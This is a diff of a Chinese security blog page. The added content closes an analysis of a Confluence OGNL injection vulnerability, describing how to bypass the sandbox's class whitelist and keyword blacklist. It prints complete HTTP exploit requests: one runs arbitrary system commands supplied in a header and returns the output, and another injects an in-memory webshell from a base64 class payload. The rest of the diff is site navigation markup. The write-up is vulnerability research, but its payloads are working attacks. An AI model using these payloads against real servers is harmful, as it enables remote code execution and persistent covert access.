+com.google.common.io
+org.apache.catalina.core
+org.ehcache
+getClass
+getClassLoader</code></pre>
+
+<p>白名单</p>
+<pre class="language-none"><code class="language-none">net.sf.hibernate.proxy.HibernateProxy
+java.lang.reflect.Proxy
+net.java.ao.EntityProxyAccessor
+net.java.ao.RawEntity
+net.sf.cglib.proxy.Factory
+java.io.ObjectInputValidation
+net.java.ao.Entity
+com.atlassian.confluence.util.GeneralUtil
+java.io.Serializable</code></pre>
+
+<p>看起来感觉很苛刻，因为我们通用的构成RCE的点全部进了黑名单。白名单里也没什么乍一看就可以直接利用的点。</p>
+<p>首先我们看到白名单的处理，在上面的代码中，只有一个地方用到了白名单</p>
+<p>![20221016171436](C:\Users\Icesoul\Documents\Tencent Files\1437565342\Image\SharePic\20221016171436.png)</p>
+<p>也就是调用静态方法时。所以尽管我们需要用到的一些类和方法不在白名单中，只要不通过<code>@</code>去调用静态方法(比如在scriptEngine的eval中去调用)，就可以绕过白名单。而对于<code>Class.forName</code>来说，尽管forName是一个静态方法。和之前一样，这里的<code>Class</code>并非<code>java.lang.Class</code>，而是上下文中root中对象所对应的class对象。这里就是用一个对象去调用静态方法，ognl的节点类型给的是<code>ognl.ASTMethod</code>（盲猜底层是通过<code>@</code>判断是否为静态方法）</p>
+<p>![20221016173701](C:\Users\Icesoul\Documents\Tencent Files\1437565342\Image\SharePic\20221016173701.png)</p>
+<p>所以成功绕过白名单，而黑名单中也没有<code>Class</code>，所以这点顺利过关。</p>
+<p>然后就是黑名单了，即便我们可以在scriptEngine的eval中去执行代码来避免白名单对静态方法的过滤。但是scriptEngine却赫然位于黑名单中，我们不妨看看黑名单过滤是怎么做的</p>
+<p>![20221016174924](C:\Users\Icesoul\Documents\Tencent Files\1437565342\Image\SharePic\20221016174924.png)</p>
+<p>直接用contains方法去匹配传入的表达式节点。这里可以用<code>+</code>进行一个绕过，因为这样可以在不影响执行结果的情况下改变传入的表达式节点。</p>
+<p>![20221016175435](C:\Users\Icesoul\Documents\Tencent Files\1437565342\Image\SharePic\20221016175435.png)</p>
+<h3 id="回显POC-2"><a href="#回显POC-2" class="headerlink" title="回显POC"></a>回显POC</h3><pre class="language-none"><code class="language-none">POST &#x2F;%24%7BClass.forName(%22jav%22%2B%22ax.script.ScriptEngineManager%22).newInstance().getEngineByName(%22js%22).eval(%22com.opensymphony.webwork.ServletActionContext.getResponse().setHeader(&#39;result&#39;%2Corg.apache.commons.io.IOUtils.toString(java.lang.Runtime.getRuntime().exec(com.opensymphony.webwork.ServletActionContext.getRequest().getHeader(&#39;cmd&#39;)).getInputStream(),&#39;utf-8&#39;))%3B%22)%7D&#x2F; HTTP&#x2F;1.1
+Host: localhost:8091
+cmd: whoami
+User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko&#x2F;20100101 Firefox&#x2F;105.0
+Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8
+Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2
+Accept-Encoding: gzip, deflate
+Connection: close
+Cookie: JSESSIONID&#x3D;B7AA75258634F37F6C26776CD09E60BA
+Upgrade-Insecure-Requests: 1
+Content-Type: application&#x2F;x-www-form-urlencoded
+Content-Length: 0</code></pre>
+
+<pre class="language-none"><code class="language-none">&#x2F;$&#123;Class.forName(&quot;jav&quot;+&quot;ax.script.ScriptEngineManager&quot;).newInstance().getEngineByName(&quot;js&quot;).eval(&quot;com.opensymphony.webwork.ServletActionContext.getResponse().setHeader(&#39;result&#39;,org.apache.commons.io.IOUtils.toString(java.lang.Runtime.getRuntime().exec(com.opensymphony.webwork.ServletActionContext.getRequest().getHeader(&#39;cmd&#39;)).getInputStream(),&#39;utf-8&#39;));&quot;)&#125;&#x2F;</code></pre>
+
+<h3 id="内存马-2"><a href="#内存马-2" class="headerlink" title="内存马"></a>内存马</h3><pre class="language-none"><code class="language-none">POST &#x2F;%24%7BClass.forName(%22jav%22%2B%22ax.script.ScriptEngineManager%22).newInstance().getEngineByName(%22js%22).eval(%22org.springframework.cglib.core.ReflectUtils.defineClass(&#39;Memshell&#39;%2Corg.springframework.util.Base64Utils.decodeFromString(com.opensymphony.xwork.ActionContext.getContext().getParameters().get(&#39;code&#39;)%5B0%5D)%2Cjava.lang.Thread.currentThread().getContextClassLoader())%3B%22)%7D&#x2F; HTTP&#x2F;1.1
+Host: localhost:8091
+cmd: whoami
+User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko&#x2F;20100101 Firefox&#x2F;105.0
+Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8
+Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2
+Accept-Encoding: gzip, deflate
+Connection: close
+Cookie: JSESSIONID&#x3D;B7AA75258634F37F6C26776CD09E60BA
+Upgrade-Insecure-Requests: 1
+Content-Type: application&#x2F;x-www-form-urlencoded
+Content-Length: 8973
+
+code&#x3D;yv66vg...</code></pre>
+
+<pre class="language-none"><code class="language-none">&#x2F;$&#123;Class.forName(&quot;jav&quot;+&quot;ax.script.ScriptEngineManager&quot;).newInstance().getEngineByName(&quot;js&quot;).eval(&quot;org.springframework.cglib.core.ReflectUtils.defineClass(&#39;Memshell&#39;,org.springframework.util.Base64Utils.decodeFromString(com.opensymphony.xwork.ActionContext.getContext().getParameters().get(&#39;code&#39;)[0]),java.lang.Thread.currentThread().getContextClassLoader());&quot;)&#125;&#x2F;</code></pre>
+
+<p>这里还需要注意一个小问题，这个内存马对比之前的有个小缺陷。那就是会受到类重复加载问题的影响，从代码中可以看出来，原始版本中的内存马的类加载器对象是new出来的，每打一次就会重新new一个新的类加载器对象出来，所以不会受到影响。而这个版本的内存马用的类加载器对象是当前线程的类加载器对象，每次打的时候用的都是这同一个类加载器对象，所以会受到类重复加载问题影响，那么为什么这版的内存马不能那么写呢？因为在new <code>javax.management.loading.MLet</code>时需要传入一个java.net.UTL[]类型的参数，这个参数是需要new出来的，而scriptEngine的eval中无法new出来数组对象，否则就会报错。</p>
+<p>![20221016181705](C:\Users\Icesoul\Documents\Tencent Files\1437565342\Image\SharePic\20221016181705.png)</p>
+<h2 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h2><p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/253398#h3-4">CVE-2021-26084：Confluence Webwork Ognl表达式注入漏洞分析-安全客 - 安全资讯平台 (anquanke.com)</a></p>
 
                 
             </div>
@@ -578,7 +754,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://example.com/2022/06/01/%E5%9F%9F%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2022%E2%80%9326923%EF%BC%89/">http://example.com/2022/06/01/%E5%9F%9F%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2022%E2%80%9326923%EF%BC%89/</a>
+                    <a href="http://example.com/2022/11/02/Confluence/">http://example.com/2022/11/02/Confluence/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -787,9 +963,10 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;Previous</div>
+                <i class="far fa-dot-circle"></i>&nbsp;Current
+            </div>
             <div class="card">
                 <a href="/2022/11/02/Confluence/">
                     <div class="card-image">
@@ -807,9 +984,9 @@
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2022-11-02
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-11-02
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
@@ -818,6 +995,7 @@
                         </span>
                     </div>
                 </div>
+
                 
             </div>
         </div>
@@ -828,13 +1006,13 @@
                 Next&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2022/05/05/%E5%8F%88%E4%B8%80%E6%AC%A1%E8%89%B0%E9%9A%BE%E7%9A%84%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/">
+                <a href="/2022/06/01/%E5%9F%9F%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2022%E2%80%9326923%EF%BC%89/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/6.jpg" class="responsive-img" alt="又一次艰难的靶场练习">
+                        <img src="/medias/featureimages/7.jpg" class="responsive-img" alt="域权限提升漏洞（CVE-2022–26923）">
                         
-                        <span class="card-title">又一次艰难的靶场练习</span>
+                        <span class="card-title">域权限提升漏洞（CVE-2022–26923）</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -845,7 +1023,7 @@
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2022-05-05
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-06-01
                             </span>
                         <span class="publish-author">
                             
